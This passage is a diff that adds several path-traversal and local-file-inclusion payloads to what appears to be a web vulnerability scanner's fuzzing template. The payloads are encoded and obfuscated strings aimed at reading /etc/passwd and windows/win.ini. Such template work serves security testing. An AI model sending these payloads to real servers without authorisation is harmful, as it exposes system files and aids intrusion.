@@ -351,6 +351,14 @@ http:
         - '{{fuzz}}windows/win.ini'
         - '\/127.0.0.1\C$/Windows///////\system32/drivers//////\etc/hosts.......'
         - '%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'
+        - 'file:\\\\etc\\passwd'
+        - "%00%00c:/../../../../windows/win.ini"
+        - "/etc/passwd%3F/"
+        - "/etc%252Fpasswd/"
+        - "/etc%252Fpasswd%3F/"
+        - "///etc/%3F/../passwd"
+        - "${br}/et${u}c%252Fpas${te}swd%3F/"
+        - "$(br)/et$(u)c%252Fpas$(te)swd%3F/"
         
     fuzzing:
       - part: query
